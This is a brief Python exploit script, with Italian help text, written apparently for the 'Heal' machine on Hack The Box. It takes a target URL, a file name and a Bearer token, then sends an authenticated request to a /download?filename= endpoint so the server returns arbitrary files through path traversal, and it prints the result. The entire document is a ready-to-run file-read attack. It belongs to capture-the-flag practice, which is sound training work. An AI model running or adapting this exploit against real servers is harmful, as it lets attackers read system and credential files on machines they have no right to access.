import requests
import argparse

parser=argparse.ArgumentParser(description="exploit per la macchina Heal HTB")

parser.add_argument("-u","--url",required=True,help="indirizzo del target")
parser.add_argument("-f","--file",required=True,help="file dal leggere")
parser.add_argument("-t","--token",required=True,help="Bearer Token di autenticazione")

argomenti=parser.parse_args()

url=argomenti.url
file=argomenti.file
token=argomenti.token

target=f"{url}/download?filename={file}"

dati={
    "Authorization": f"Bearer {token}"
}

try:
    print("[+] invio richiesta...")
    richiesta=requests.get(url=target,headers=dati)
    print(f"[+] status code: {richiesta.status_code}")
    print(richiesta.text)
except:
    print("ERRORE")